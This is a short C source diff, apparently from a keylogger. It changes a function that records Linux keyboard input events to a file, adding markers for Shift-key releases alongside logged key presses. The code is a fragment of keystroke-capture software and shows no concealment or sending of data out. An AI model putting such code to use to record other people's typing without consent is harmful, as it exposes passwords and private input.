@@ -270,8 +270,13 @@
 */
 void log_keystroke_humanformat(FILE * file, struct input_event event)
 {
-    if (event.value != KEYPRESSED)
-		return;
-	log_keys_lazily(file, event.code);
+	if (event.value == KEYRELEASED) {
+		switch(event.code) {
+			case KEY_LEFTSHIFT:		fprintf(file, "<LEFTSHIFT_RELEASED>"); break;
+			case KEY_RIGHTSHIFT:	fprintf(file, "<RIGHTSHIFT_RELEASED>"); break;
+		}
+	}
+    else if (event.value == KEYPRESSED)
+		log_keys_lazily(file, event.code);
 	fflush(file);
 }
